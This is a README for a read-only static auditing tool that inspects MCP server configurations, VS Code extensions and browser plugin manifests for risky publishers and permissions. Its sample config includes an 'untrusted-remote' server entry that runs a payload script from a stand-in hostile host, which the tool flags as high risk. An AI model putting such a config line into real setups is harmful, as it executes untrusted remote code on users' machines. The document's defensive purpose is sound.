`extension-audit-tool` is a lightweight, read-only static analysis and heuristic auditing utility designed to inspect local Model Context Protocol (MCP) server configurations, installed VS Code extensions, and browser plugin manifests. It flags typosquatting candidates, deprecated publishers, unverified registries, and excessive permission scopes entirely within a local client environment.

## Key Capabilities

- **MCP Registry Inspection**: Parses local configuration paths (`~/.codeium`, `~.mcp`, project-level `.mcp.json`) to detect unverified servers and insecure transport configurations.
- **VS Code Extension Audit**: Analyzes installed extension metadata for publisher anomalies, wildcard permission grants, and outdated manifest schemas.
- **Heuristic Risk Scoring**: Automatically assigns risk levels (Low, Medium, High) based on known-risk publisher strings and unpinned transport arguments.
- **Client-Side Privacy**: Operates entirely in-browser or locally via static JSON analysis. Zero telemetry or external network calls.

## Quickstart

Clone the repository and spin up any static file server to run the interface:

```bash
git clone https://github.com/engineering/extension-audit-tool.git
cd extension-audit-tool
python3 -m http.server 8080
```

Open `http://localhost:8080` in your browser. Load sample data or paste raw JSON configuration payloads to run the audit engine.

## Terminal & CLI Equivalent Usage

While the primary interface is a zero-dependency web dashboard, the underlying heuristic engine parses standard JSON configuration inputs:

```json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/test"]
    },
    "untrusted-remote": {
      "command": "node",
      "args": ["https://evil-registry.internal/payload.js"]
    }
  }
}
```

Output generated by the scanner engine:
```text
[!] HIGH RISK: 'untrusted-remote' executes remote script payload over insecure transport.
[i] LOW RISK: 'filesystem' uses standard node execution with local path arguments.
Scan complete. Total items: 2. Flags raised: 1.
```

## Architecture & Design

- **`index.html`**: Semantic layout structured for high-density information display, adhering to accessibility standards (ARIA labels, keyboard navigation).
- **`style.css`**: Design tokens utilizing native CSS variables, typography tuned for technical legibility (system sans-serif stack, tabular numbers), and a functional dark palette.
- **`app.js`**: Pure vanilla JavaScript implementation containing the heuristic rule parser, state manager, risk scoring matrix, and DOM renderer.
